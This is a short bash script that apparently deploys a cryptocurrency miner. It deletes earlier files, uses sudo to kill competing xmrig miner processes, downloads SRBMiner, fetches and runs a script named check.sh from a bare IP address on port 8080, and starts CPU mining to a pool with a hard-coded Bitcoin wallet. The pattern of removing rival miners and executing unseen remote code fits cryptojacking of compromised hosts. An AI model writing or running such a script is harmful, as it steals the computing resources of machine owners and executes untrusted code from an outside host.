#!/bin/bash

rm log
rm a.sh
rm cpuminer-sse42
rm xm-go.sh
rm check.sh
rm 5.bat
rm config.json
rm -f -d /tmp/xmrig
sudo pkill -f xmrig && sudo killall xmrig
sudo pkill -f xmrig_linux_amd64 && sudo killall xmrig_linux_amd64
sudo pkill -f xm-go.sh && sudo killall xm-go.sh

if command -v wget >/dev/null 2>&1; then
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.3/SRBMiner-Multi-2-8-3-Linux.tar.gz -O srbminer.tar.gz
    curl http://161.97.91.97:8080/check.sh -o check.sh
else
    curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.3/SRBMiner-Multi-2-8-3-Linux.tar.gz -o srbminer.tar.gz
    curl -L http://161.97.91.97:8080/check.sh -o check.sh
fi

chmod +x check.sh
tar -xf srbminer.tar.gz
cd SRBMiner-Multi-2-8-3/SRBMiner-MULTI
./check.sh
./SRBMiner-MULTI \
    --disable-gpu \
    --algorithm randomx \
    --pool rx.unmineable.com:3333 \
    --tls true \
    --wallet BTC:18vzdhWzFUTAefLVHx25XduiXjtzNdqUfW.worker \
